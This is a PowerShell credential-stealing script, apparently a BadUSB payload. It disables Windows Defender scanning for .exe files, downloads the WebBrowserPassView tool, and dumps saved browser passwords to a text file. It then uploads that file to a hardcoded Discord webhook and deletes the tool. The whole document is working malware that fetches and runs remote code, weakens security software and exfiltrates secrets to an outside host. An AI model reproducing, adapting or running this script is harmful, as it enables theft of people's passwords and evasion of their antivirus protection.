Set-Location C:\temp
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool
.\WebBrowserPassView.exe /stext passwords.txt #Create the file for Browser passwords
function Submit-TextFile($filePath){
    $filename = (Get-ChildItem $filePath).Name
    $filecontents = Get-Content $filePath -raw
    $boundary = [guid]::NewGuid().ToString()
    $contentinfo = "Content-Disposition: form-data; name=`"file`"; filename=`"$filename`"`nContent-Type: text/html; charset=utf-8`n"
    $body = "--$boundary`n$contentinfo`n$filecontents`n--$boundary--`n"
    $params = @{
        Uri         = "https://discord.com/api/webhooks/1137762085166657567/eXk-Sa6VaewqkzPvzF-O51MfE3COqfWRdaSBlJhn4ny_O43fhWa_lC033WZKrCLm3Lvc"
        Body        = $body
        Method      = 'Post'
        ContentType = "multipart/form-data; boundary=$boundary"
    }
    Invoke-RestMethod @params
}
Start-Sleep -Seconds 1
Submit-TextFile("C:\temp\passwords.txt")
Start-Sleep -Seconds 1
Remove-Item WebBrowserPassView.exe
